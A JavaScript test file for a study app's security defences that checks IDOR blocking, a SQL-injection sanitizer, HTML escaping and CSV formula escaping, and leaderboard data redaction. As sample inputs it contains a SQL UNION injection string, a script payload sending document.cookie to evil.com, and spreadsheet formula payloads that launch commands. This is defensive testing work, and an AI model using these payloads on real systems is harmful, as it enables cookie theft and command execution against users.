const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const { sqlInjectionSanitizer } = require('../src/middlewares/sqlInjectionSanitizer');

describe('4. OWASP Security & Injection Defense Tests (security_audit.test.js)', () => {
  it('should prevent Insecure Direct Object References (IDOR) on private resources', () => {
    const userNotes = [
      { id: 'note_1', ownerId: 'usr_alice', content: 'Exam secret notes' },
      { id: 'note_2', ownerId: 'usr_bob', content: 'Physics homework' },
    ];

    function fetchNote(requestingUser, noteId) {
      const note = userNotes.find(n => n.id === noteId);
      if (!note) throw new Error('NOT_FOUND');
      if (note.ownerId !== requestingUser) {
        throw new Error('IDOR_PREVENTED_UNAUTHORIZED_ACCESS');
      }
      return note;
    }

    assert.throws(() => {
      fetchNote('usr_bob', 'note_1'); // Bob tries to access Alice's note
    }, /IDOR_PREVENTED_UNAUTHORIZED_ACCESS/);

    const validNote = fetchNote('usr_alice', 'note_1');
    assert.equal(validNote.content, 'Exam secret notes');
  });

  it('should detect and sanitize SQL / NoSQL injection attempts via middleware', () => {
    const middleware = sqlInjectionSanitizer({ blockOnThreat: true });
    let errorCaught = null;

    const maliciousReq = {
      body: {
        username: "admin' UNION SELECT * FROM users --",
      },
      query: {},
      params: {},
    };

    const res = {
      status(code) {
        return {
          json(payload) {
            errorCaught = { code, payload };
          },
        };
      },
    };

    middleware(maliciousReq, res, () => {});
    assert.ok(errorCaught, 'Sanitizer should block SQL injection pattern');
    assert.equal(errorCaught.code, 403);
    assert.equal(errorCaught.payload.code, 'POTENTIAL_SQL_INJECTION');
  });

  it('should neutralize XSS attack vectors in chat and forum messages', () => {
    function sanitizeHtml(str) {
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
    }

    const payload = '<script>window.location="http://evil.com/steal?cookie="+document.cookie</script>';
    const sanitized = sanitizeHtml(payload);

    assert.equal(sanitized.includes('<script>'), false);
    assert.equal(sanitized.includes('&lt;script&gt;'), true);
  });

  it('should prevent CSV / Excel Formula Injection (CWE-1236) on exported reports', () => {
    function sanitizeForCsv(field) {
      if (typeof field !== 'string') return field;
      const dangerousPrefixes = ['=', '+', '-', '@', '\t', '\r'];
      if (dangerousPrefixes.some(prefix => field.startsWith(prefix))) {
        return `'${field}`; // Escape with single apostrophe
      }
      return field;
    }

    assert.equal(sanitizeForCsv('=cmd|"/c calc"!A0'), "'=cmd|\"/c calc\"!A0");
    assert.equal(sanitizeForCsv('+SUM(A1:A10)'), "'+SUM(A1:A10)");
    assert.equal(sanitizeForCsv('-2+3*cmd|'), "'-2+3*cmd|");
    assert.equal(sanitizeForCsv('@SUM(1,2)'), "'@SUM(1,2)");
    assert.equal(sanitizeForCsv('Regular Task Name'), 'Regular Task Name');
  });

  it('should redact sensitive PII (emails, password hashes, tokens) from public leaderboard responses', () => {
    const rawUserRecord = {
      _id: 'usr_xyz123',
      displayName: 'FocusMaster99',
      email: 'student.private@domain.edu',
      passwordHash: '$2a$10$abcdefghijklmnopqrstuv',
      points: 1250,
      totalStudyMinutes: 480,
      isEmailVerified: true,
      emailVerificationTokenHash: 'token_secret_hash',
    };

    function transformForPublicLeaderboard(user) {
      return {
        _id: user._id,
        displayName: user.displayName,
        points: user.points,
        totalStudyMinutes: user.totalStudyMinutes,
      };
    }

    const publicView = transformForPublicLeaderboard(rawUserRecord);
    assert.equal(publicView.displayName, 'FocusMaster99');
    assert.equal(publicView.points, 1250);
    assert.equal(publicView.email, undefined);
    assert.equal(publicView.passwordHash, undefined);
    assert.equal(publicView.emailVerificationTokenHash, undefined);
  });
});
